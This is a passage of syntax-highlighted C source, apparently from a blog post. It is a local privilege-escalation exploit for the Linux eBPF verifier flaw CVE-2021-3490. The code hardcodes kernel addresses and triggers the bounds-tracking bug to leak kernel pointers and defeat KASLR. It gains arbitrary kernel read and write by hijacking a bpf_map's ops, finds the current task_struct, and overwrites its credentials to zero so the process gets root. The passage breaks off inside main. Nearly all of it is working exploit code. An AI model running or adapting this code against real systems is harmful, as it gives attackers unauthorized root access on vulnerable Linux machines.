ARRAY_MAP_OPS   0xffffffff822363e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK       0xffffffff82e1b400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED       0xffffffff82e88f20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SIZE 0x2000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG    BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> current_task, current_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> next_task - <span class="hljs-number">0x818</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">size_t</span> map_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_OPS(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-type">size_t</span> map_ops_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_ops_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        LEAK_MAP_OPS(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_MAP_DATA(__map_fd, __off)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-comment">/* for debug only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_map_data</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> map_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x110</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>            TRIGGER_VULN(map_fd),<br>            MAKE_VULN_REG(map_fd),<br>            READ_MAP_DATA(map_fd, (<span class="hljs-number">0x110</span> - <span class="hljs-number">0x8</span> * i)), <br>            BPF_EXIT_INSN()<br>        &#125;;<br><br>        <span class="hljs-keyword">if</span> (run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to run bpf prog!&quot;</span>);<br>        &#125;<br><br>        key = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to look up the map!&quot;</span>);<br>        &#125;<br>        map_data[i] = value[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x200</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, map_data[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> map_fd;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> log_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, MAP_SIZE, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map.ops ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_ops_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    map_ops_addr = value[<span class="hljs-number">0</span>];<br>    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;<br>    kernel_base += kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel_offset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel_base: \033[0m%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffff000000000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak addr of bpf_map!&quot;</span>);<br>    &#125;<br><br>    map_addr = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0x110</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n&quot;</span>, map_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Search for current task_struct&#x27;s addr...&quot;</span>);<br>    current_task = search_for_current_task(map_fd);<br>    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="hljs-number">0xad8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current cred&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_cred);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Hijacking the bpf_map...&quot;</span>);<br>    make_arbitrary_write_ops(map_fd);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Overwriting the current-&gt;cred...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (arbitrary_write_4_bytes_by_map(map_fd, current_cred+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>*i, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span 